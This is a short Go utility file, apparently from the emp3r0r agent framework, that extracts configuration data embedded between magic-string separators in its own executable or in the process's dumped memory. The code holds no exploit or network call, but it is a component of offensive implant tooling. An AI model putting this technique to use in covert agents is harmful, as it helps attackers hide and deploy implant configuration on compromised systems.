package util

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

// DigEmbededDataFromFile search args[0] file content for data embeded between two separators
// separator is MagicString*3
func DigEmbeddedDataFromArg0() ([]byte, error) {
	wholeStub, err := ioutil.ReadFile(os.Args[0])
	if err != nil {
		return nil, err
	}

	return DigEmbeddedData(wholeStub)
}

// DigEmbeddedData search for embedded data in given []byte buffer
func DigEmbeddedData(data []byte) (embedded_data []byte, err error) {
	sep := []byte(strings.Repeat(emp3r0r_data.MagicString, 3))
	err = fmt.Errorf("No magic string found")

	// locate embedded_data
	split := bytes.Split(data, sep)
	if len(split) < 2 {
		return
	}
	data = split[1]
	if len(data) <= 0 {
		return
	}
	return
}

// DigEmbededDataFromMem search process memory for data embeded between two separators
// separator is MagicString*3
func DigEmbededDataFromMem() (data []byte, err error) {
	mem_regions, err := DumpSelfMem()
	if err != nil {
		err = fmt.Errorf("Cannot dump self memory: %v", err)
		return
	}

	var (
		mem_region []byte
	)
	for _, mem_region = range mem_regions {
		data, err = DigEmbeddedData(mem_region)
		if err != nil {
			log.Print(err)
			continue
		}
		break
	}
	if len(data) <= 0 {
		return nil, fmt.Errorf("No config data found in memory")
	}

	return
}

// DumpSelfMem dump all mapped memory regions of current process
func DumpSelfMem() ([][]byte, error) {
	return crossPlatformDumpSelfMem()
}
